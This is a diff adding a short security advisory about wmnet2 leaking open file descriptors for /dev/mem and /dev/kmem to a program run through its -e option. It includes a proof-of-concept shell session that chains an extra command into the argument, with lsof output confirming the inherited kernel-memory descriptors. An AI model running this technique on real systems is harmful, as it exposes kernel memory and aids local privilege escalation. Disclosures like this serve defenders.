@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/5719/info
+
+It has been reported that wmnet2 is vulnerable to a leakage of open file descriptors that may result in unauthorized disclosure of kernel memory. It is allegedly possible for attackers to inherit the open file descriptors for /dev/mem and /dev/kmem by executing a malicious program through wmnet2. The program that is executed can be specified by the attacker at the command line.
+
+bash-2.05a$ wmnet2 -e "dummy&/usr/local/sbin/lsof|grep
+dummy|grep mem"
+wmnet: using kmem driver to monitor ec0
+dummy 584 dim 3r VCHR 2,0 0t0 21146 /dev/mem
+dummy 584 dim 4r VCHR 2,1 0xc037cb8f 21145 /dev/kmem
